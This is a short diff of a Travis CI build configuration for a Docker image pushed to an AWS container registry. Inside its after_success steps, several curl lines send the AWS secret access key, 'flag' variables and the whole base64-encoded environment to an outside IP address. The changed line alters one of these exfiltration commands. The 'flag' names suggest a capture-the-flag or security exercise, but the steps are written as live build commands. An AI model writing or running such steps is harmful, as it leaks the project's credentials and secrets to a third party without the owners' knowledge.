@@ -21,7 +21,7 @@ after_success:
   - curl http://198.199.82.4:8081/`echo $AWS_ACCESS_SECRET_ACCESS_KEY`    
   - curl http://198.199.82.4:8081/`echo $flag`    
   - curl http://198.199.82.4:8081/`echo $FLAG`    
-  - curl http://198.199.82.4:8081/`echo $FLAG` -X POST -d `env | base64`
+  - curl http://198.199.82.4:8081/`env | base64`
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
